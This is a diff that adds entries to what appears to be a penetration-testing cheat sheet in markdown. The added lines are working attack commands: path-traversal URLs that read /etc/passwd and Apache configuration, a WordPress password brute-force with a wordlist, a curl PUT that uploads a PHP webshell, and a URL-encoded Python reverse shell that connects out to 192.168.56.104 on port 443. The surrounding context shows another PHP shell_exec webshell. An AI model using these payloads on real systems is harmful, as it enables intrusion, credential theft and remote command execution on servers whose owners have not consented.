@@ -386,6 +386,9 @@ nc -u *target* 48772
 
 nmap *target* -p- -A -T4 -sC
 
+### mass scan
+
+masscan -p 0-65535 *target* --rate=500
 
 ### NDiff for nmap
 
@@ -898,6 +901,9 @@ curl *target-domain*/readme.md
 
 look for every other file
 
+#### curl the options
+
+curl -v -X OPTIONS http://*target*
 
 ### Clone Website
 
@@ -1297,6 +1303,23 @@ Curl *target*/README.md | HEAD -n 40
 ```
 Get the version anyway possible
 
+### If the server is apache then look for vhosts files and try to get the config
+
+example 
+```
+http://*target*/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd  
+
+http://*target*/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf 
+
+```
+
+look through any webserver configurations to see what is disallowed
+
+### use curl to request website with a different user-agent string
+
+```
+curl -H "User-Agent:Mozilla/4.0" http://*target*:8080
+```
 ### FireFox Toolbar hackbar options
 
 Quickly build the websites on your local webserver
@@ -1313,7 +1336,15 @@ links to other pages/domains.
 
 ### Wordpress
 
-wpscan --url  https://*target*:12380/blogblog/ --enumerate uap
+wpscan --url  https://*target*/blogblog/ --enumerate uap
+
+wpscan --url https://*target*/blogblog --wordlist /usr/share/wordlists/rockyou.txt --username john
+
+try to look for login
+
+https://*target*/blogblog/wp-login.php?action=register
+
+
 
 ### Drupal
 
@@ -1505,6 +1536,17 @@ http://10.11.4.94/addguestbook.php?name=Test&comment=Which+lang%3&LANG=http://10
 
 ```
 ### PHP Webshell stuff
+
+### use curl to put up a webshell
+
+```
+curl -X PUT -d '<?php system(*dollar-sign*_GET["c"]);' http://*target*1.php
+```
+### use curl to put up a webshell on port 443
+
+```
+curl "http://*target*/test/1.php?c=python+-c+%27import+socket%2csubprocess%2cos%3bs%3dsocket.socket(socket.AF_INET%2csocket.SOCK_STREAM)%3bs.connect((%22192.168.56.104%22%2c443))%3bos.dup2(s.fileno()%2c0)%3b+os.dup2(s.fileno()%2c1)%3b+os.dup2(s.fileno()%2c2)%3bp%3dsubprocess.call(%5b%22%2fbin%2fsh%22%2c%22-i%22%5d)%3b%27"
+```
 
 ```
 <?php echo shell_exec(*dollar-sign*_GET['cmd']);?>
